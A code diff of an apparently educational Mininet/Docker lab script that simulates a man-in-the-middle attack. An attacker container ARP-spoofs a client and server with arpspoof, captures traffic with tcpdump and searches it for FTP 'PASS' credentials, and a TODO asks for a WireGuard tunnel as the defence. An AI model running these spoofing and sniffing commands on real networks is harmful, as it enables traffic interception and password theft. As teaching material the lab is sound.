@@ -26,42 +26,42 @@ def testTopo():
     net.addController('c0')
 
     info('*** Adding hosts\n')
-    h1 = net.addDockerHost('h1', dimage='sec_test', ip='10.0.0.1', cpuset_cpus="1", cpu_quota=25000)
-    h2 = net.addDockerHost('h2', dimage='sec_test', ip='10.0.0.2', cpuset_cpus="1", cpu_quota=25000)
-    h3 = net.addDockerHost('h3', dimage='sec_test', ip='10.0.0.3', cpuset_cpus="0", cpu_quota=25000)
+    client = net.addDockerHost('client', dimage='sec_test', ip='10.0.0.1', cpuset_cpus="1", cpu_quota=25000)
+    server = net.addDockerHost('server', dimage='sec_test', ip='10.0.0.2', cpuset_cpus="1", cpu_quota=25000)
+    attacker = net.addDockerHost('attacker', dimage='sec_test', ip='10.0.0.3', cpuset_cpus="0", cpu_quota=25000)
 
     info('*** Adding switch\n')
     s1 = net.addSwitch('s1')
 
     info('*** Creating links\n')
-    net.addLinkNamedIfce(s1, h1, bw=10, delay='1ms', use_htb=True)
-    net.addLinkNamedIfce(s1, h2, bw=10, delay='1ms', use_htb=True)
-    net.addLinkNamedIfce(s1, h3, bw=10, delay='1ms', use_htb=True)
+    net.addLinkNamedIfce(s1, client, bw=10, delay='1ms', use_htb=True)
+    net.addLinkNamedIfce(s1, server, bw=10, delay='1ms', use_htb=True)
+    net.addLinkNamedIfce(s1, attacker, bw=10, delay='1ms', use_htb=True)
 
     info('*** Starting network\n')
     net.start()
 
     info('*** Attacker, Client and Server setup\n')
-    h1.cmd("ping -c 10 10.0.0.2")
-    h3.cmd("printf -- '#!/bin/bash\narpspoof -i h3-s1 -t 10.0.0.1 10.0.0.2 >> /dev/null &\narpspoof -i h3-s1 -t 10.0.0.2 10.0.0.1 >> /dev/null &' > spoof.sh; chmod +x spoof.sh; ./spoof.sh")
+    client.cmd("ping -c 10 10.0.0.2")
+    attacker.cmd("printf -- '#!/bin/bash\narpspoof -i attacker-s1 -t 10.0.0.1 10.0.0.2 >> /dev/null &\narpspoof -i attacker-s1 -t 10.0.0.2 10.0.0.1 >> /dev/null &' > spoof.sh; chmod +x spoof.sh; ./spoof.sh")
     sleep(10)
-    h3.cmd('tcpdump -vvv -i h3-s1 -B 100000 ip >> messages.log &')
+    attacker.cmd('tcpdump -vvv -i attacker-s1 -B 100000 ip >> messages.log &')
     sleep(10)
-    h2.cmd("mkdir -p /var/run/vsftpd/empty")
-    h2.cmd("vsftpd &")
+    server.cmd("mkdir -p /var/run/vsftpd/empty")
+    server.cmd("vsftpd &")
 
     # TODO: Setup a tunnel to protect the ftp request from the MitM attacker!
     # You can use test_connection to verify that the tunnel was established.
     # Remember that you have to request the file through the tunnel and not via external IP of the server!
     # Generate the keys for wireguard and grep them from the host like this
-    # key = h1.cmd("cat keyfile").replace('\n', ' ').replace('\r', '')
+    # key = client.cmd("cat keyfile").replace('\n', ' ').replace('\r', '')
 
-    test_connection(h1, "10.0.0.2")
-    login_at_ftp_server(h1, "10.0.0.2")
+    test_connection(client, "10.0.0.2")
+    login_at_ftp_server(client, "10.0.0.2")
 
     info('*** Extract Passwords\n')
     sleep(20)
-    output = h3.cmd('cat messages.log')
+    output = attacker.cmd('cat messages.log')
     password_found = False
     for line in output.split("\n"):
         if "PASS" in line:
